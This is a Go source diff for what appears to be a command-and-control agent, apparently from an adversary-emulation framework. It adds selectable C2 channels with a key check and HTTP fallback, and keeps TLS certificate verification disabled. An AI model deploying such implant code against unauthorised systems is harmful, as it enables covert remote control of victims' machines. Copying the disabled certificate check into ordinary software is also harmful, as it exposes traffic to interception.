@@ -10,7 +10,9 @@ import (
 	"reflect"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
+	"path/filepath"
 
 	"../contact"
 	"../execute"
@@ -41,8 +43,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, sleep int, executors []string, privilege string,
-				  exe_name string) map[string]interface{} {
+func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	rand.Seed(time.Now().UnixNano())
@@ -62,12 +63,20 @@ func buildProfile(server string, group string, sleep int, executors []string, pr
 	profile["ppid"] = strconv.Itoa(os.Getppid())
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
 	profile["privilege"] = privilege
-	profile["exe_name"] = exe_name
+	profile["exe_name"] = filepath.Base(os.Args[0])
+	profile["c2"] = strings.ToUpper(c2)
+
 	return profile
 }
 
-func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact {
-	coms, _ := contact.CommunicationChannels["API"]
+func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
+	coms, _ := contact.CommunicationChannels[profile["c2"].(string)]
+	if !validC2Configuration(coms, profile["c2"].(string), c2Config) {
+		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
+		profile["c2"] = "HTTP"
+		coms, _ = contact.CommunicationChannels[profile["c2"].(string)]
+	}
+
 	if coms.Ping(profile["server"].(string)) {
 		//go util.StartProxy(profile["server"].(string))
 		return coms
@@ -80,7 +89,16 @@ func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact 
 	return coms
 }
 
-func Core(server string, group string, sleep string, delay int, exe_name string, executors []string, verbose bool) {
+func validC2Configuration(coms contact.Contact, c2Selection string, c2Config map[string]string) bool {
+	if strings.EqualFold(c2Config["c2Name"], c2Selection) {
+		if _, valid := contact.CommunicationChannels[c2Selection]; valid {
+			return coms.C2RequirementsMet(c2Config["c2Key"])
+		}
+	}
+	return false
+}
+
+func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	sleepInt, _ := strconv.Atoi(sleep)
@@ -93,12 +111,13 @@ func Core(server string, group string, sleep string, delay int, exe_name string,
 	output.VerbosePrint(fmt.Sprintf("sleep=%d", sleepInt))
 	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
+	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
 
-	profile := buildProfile(server, group, sleepInt, executors, privilege, exe_name)
+	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"])
 	util.Sleep(float64(delay))
 
 	for {
-		coms := chooseCommunicationChannel(profile)
+		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
 			for { runAgent(coms, profile) }
 		}
